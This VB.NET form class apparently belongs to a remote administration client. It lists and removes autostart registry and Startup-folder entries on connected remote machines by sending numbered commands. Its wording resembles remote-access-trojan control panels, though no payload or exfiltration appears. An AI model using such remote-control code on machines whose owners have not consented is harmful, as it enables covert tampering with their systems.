Public Class StartupMonitor

    Dim startupGroups As New Dictionary(Of String, String) From {{"1", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"}, {"2", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"}, {"3", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"}, {"4", "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"}, {"5", "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"}, {"6", "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"}}


    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Settings.AddLog("Pending", Settings.State.Pending, "Requesting startup programs...")
        ListViewStartupPrograms.Items.Clear()
        If Main.ListViewMain.Items.Count > 0 Then
            If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
        Else
            MsgBox("No Users online.", MsgBoxStyle.Exclamation)
        End If
        Try
            Main.WriteCommand(Main.SelectedUserID & "|66")
            Waiting.ShowDialog()
        Catch x As Exception
            MsgBox("Unable to Send Command." & x.Message, MsgBoxStyle.OkOnly, "Startup Monitor")
        End Try
    End Sub

    Public Function GetPrograms(ByVal Programs As String) As Integer

        For Each x As String In Programs.Substring(0, Programs.Length - 3).Split({"~~~"}, StringSplitOptions.None)
            Dim y As String() = x.Split({"|||"}, StringSplitOptions.None)
            If Not ListViewStartupPrograms.Groups.Contains(New ListViewGroup(y(0), startupGroups(y(0)))) Then ListViewStartupPrograms.Groups.Add(New ListViewGroup(y(0), startupGroups(y(0))))
            ListViewStartupPrograms.Items.Add(New ListViewItem With {.Text = y(1), .Group = ListViewStartupPrograms.Groups(y(0)), .ImageIndex = 0}).SubItems.Add(y(2))
        Next
        Return ListViewStartupPrograms.Items.Count
    End Function


    Private Sub RenoveToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenoveToolStripMenuItem.Click
        Dim IsRegKey As Boolean = False
        Dim SelectedStartupLocation As String = Nothing
        Dim NeedsElevationToRemove As Boolean = False
        If MessageBox.Show("Are you sure you like to remove this program from the autostart?", "Remove Program", MessageBoxButtons.YesNo, MessageBoxIcon.Question) = Windows.Forms.DialogResult.Yes Then
            Settings.AddLog("Pending", Settings.State.Pending, "Removing startup program...")
            For Each item As ListViewItem In ListViewStartupPrograms.SelectedItems
                SelectedStartupLocation = item.Group.Header
            Next



            If SelectedStartupLocation = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" Then
                IsRegKey = True
                SelectedStartupLocation = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
            ElseIf SelectedStartupLocation = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" Then
                IsRegKey = True
                SelectedStartupLocation = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"
            ElseIf SelectedStartupLocation = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" Then
                NeedsElevationToRemove = True
                IsRegKey = True
                SelectedStartupLocation = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
            ElseIf SelectedStartupLocation = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce" Then
                NeedsElevationToRemove = True
                IsRegKey = True
                SelectedStartupLocation = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
            ElseIf SelectedStartupLocation = "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" Then
                IsRegKey = False
                SelectedStartupLocation = "C:\Users\User\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
            ElseIf SelectedStartupLocation = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" Then
                IsRegKey = False
                SelectedStartupLocation = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
            Else
                MsgBox("Unknown Startup Location!", MsgBoxStyle.Critical)
                Exit Sub
            End If

            If NeedsElevationToRemove Then
                MessageBox.Show("To remove this startup item the server need to have admin privileges." & vbNewLine & "If the server is not elevated, this startup item cannot be removed." & vbNewLine & "In this case please make sure to elevate the server before the startup item removal", "Requires Elevation", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
            End If

            Main.WriteData(IsRegKey.ToString & "|||" & SelectedStartupLocation & "|||" & ListViewStartupPrograms.SelectedItems(0).Text)
            Main.WriteCommand(Main.SelectedUserID & "|67")
            Waiting.ShowDialog()



            If Main.ListViewMain.Items.Count > 0 Then
                If Main.ListViewMain.SelectedItems.Count <> 0 Then _
                    Main.SelectedUserID = Main.ListViewMain.SelectedItems(0).Text
            Else
                MsgBox("No Users online.", MsgBoxStyle.Exclamation)
            End If


        End If
    End Sub

    Private Sub ContextMenuStripStartup_Opening(sender As Object, e As System.ComponentModel.CancelEventArgs) Handles ContextMenuStripStartup.Opening
        If ListViewStartupPrograms.SelectedItems.Count = 0 Then
            e.Cancel = True
        End If
    End Sub

    Private Sub StartupMonitor_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ListViewStartupPrograms.Items.Clear()
    End Sub
End Class